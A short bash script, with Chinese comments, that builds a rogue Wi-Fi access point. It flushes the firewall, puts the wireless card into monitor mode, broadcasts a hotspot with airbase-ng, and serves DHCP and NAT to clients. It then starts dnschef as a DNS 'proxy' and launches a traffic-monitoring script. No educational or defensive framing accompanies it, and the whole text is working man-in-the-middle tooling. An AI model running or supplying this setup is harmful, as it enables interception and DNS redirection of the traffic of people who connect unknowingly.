#清空iptables
iptables -t nat -F
iptables -t nat -X  
iptables -t nat -P PREROUTING ACCEPT  
iptables -t nat -P POSTROUTING ACCEPT  
iptables -t nat -P OUTPUT ACCEPT  
iptables -t mangle -F  
iptables -t mangle -X  
iptables -t mangle -P PREROUTING ACCEPT  
iptables -t mangle -P INPUT ACCEPT  
iptables -t mangle -P FORWARD ACCEPT  
iptables -t mangle -P OUTPUT ACCEPT  
iptables -t mangle -P POSTROUTING ACCEPT  
iptables -F  
iptables -X  
iptables -P FORWARD ACCEPT  
iptables -P INPUT ACCEPT  
iptables -P OUTPUT ACCEPT  
iptables -t raw -F  
iptables -t raw -X  
iptables -t raw -P PREROUTING ACCEPT  
iptables -t raw -P OUTPUT ACCEPT 

#处理无线网卡
ifconfig wlan0 up
ifconfig wlan0 down
iwconfig wlan0 mode monitor
ifconfig wlan0 up
airmon-ng start wlan0
sleep 2
airmon-ng check kill
sleep 2
airmon-ng start wlan0
sleep 2

#用airbase建立热点


netka=`ls /sys/class/net | sed -n '$p'`

gnome-terminal -x bash -c "airbase-ng -e $1 -c 11 $netka" 
sleep 4

#配置at0
ifconfig at0 up
ifconfig at0 10.0.0.1 netmask 255.255.255.0
route add -net 10.0.0.0 netmask 255.255.255.0 gw 10.0.0.1

#打开ip转发
echo 1 > /proc/sys/net/ipv4/ip_forward

#开启dhcp
kill -9 `pgrep dhcp`
sleep 2
pgrep dhcp
dhcpd -cf /etc/dhcp/dhcpd.conf -pf /var/run/dhcpd.pid at0
sleep 2
service isc-dhcp-server start 

#配置NAT
iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE
iptables -A FORWARD -i wlan0 -o eth0 -j ACCEPT
iptables -A FORWARD -p tcp --syn -s 10.0.0.0/24 -j TCPMSS --set-mss 1356

#DNS“代理”
gnome-terminal -x bash -c "dnschef -i 10.0.0.1 --nameserver 210.73.64.1#53"
sleep 2

#wkjc
gnome-terminal -x bash -c "./text/NetFlow.sh"













